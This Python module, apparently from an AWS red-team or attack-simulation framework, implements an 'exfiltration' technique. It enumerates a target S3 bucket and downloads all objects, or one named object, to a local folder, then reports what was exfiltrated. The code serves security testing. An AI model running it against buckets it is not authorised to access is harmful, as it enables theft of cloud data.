'''
Module Name: Exfil_S3_Bucket.py
Description: Download an object or all objects in a target S3 Bucket to local directory
Ref: https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3/client/download_file.html
'''
from core.AWSFunctions import CreateClient
from pathlib import Path
import os

def TechniqueMain(bucket_name, object = None):

    # initialize boto3 s3 client
    my_client = CreateClient('s3')
    all_bucket_object_keys = []

    # add all objects in bucket if no object specified by user
    if object in [None, ""]:
        # s3 object enumeration to get all objects in bucket
        response = my_client.list_objects_v2(Bucket=bucket_name)
        all_bucket_objects = response['Contents']

        for object in all_bucket_objects:
            all_bucket_object_keys.append(object.get('Key'))

    # only add object specified to download list
    else:
        all_bucket_object_keys.append(object)

    # initialize download counter
    object_download_counter = 0
    # initialize list to track downloaded objects
    downloaded_objects = []

    # create local download path with bucket name
    download_path = f"./output/s3_bucket_download/{bucket_name}"

    # download all objects in list
    try:
        for object_key in all_bucket_object_keys:
            download_file = f"{download_path}/{object_key}"
            
            # check local download file path exists and create if not
            if Path(os.path.dirname(download_file)).exists():
                pass
            else:
                os.makedirs(os.path.dirname(download_file))
            
            # download objects
            response = my_client.download_file(bucket_name, object_key, download_file)
            # add object to downloaded objects list
            downloaded_objects.append(object_key)
            object_download_counter += 1

    except Exception as e:
        return f"Error: {e}"

    return {"Totals Object Exfiltrated" : object_download_counter, "Exfil Path" : download_path, "Objects Exfiltrated" : str(downloaded_objects)}

def TechniqueInputSrc() -> list:
    '''This function returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Target Bucket Name", "id" : "bucket-text-input", "type" : "text", "placeholder" : "data-bucket", "element_type" : "dcc.Input"},
        {"title" : "Object Name to Exfil (optional)", "id" : "object-text-input", "type" : "text", "placeholder" : "bucket-object-name", "element_type" : "dcc.Input"}
    ]
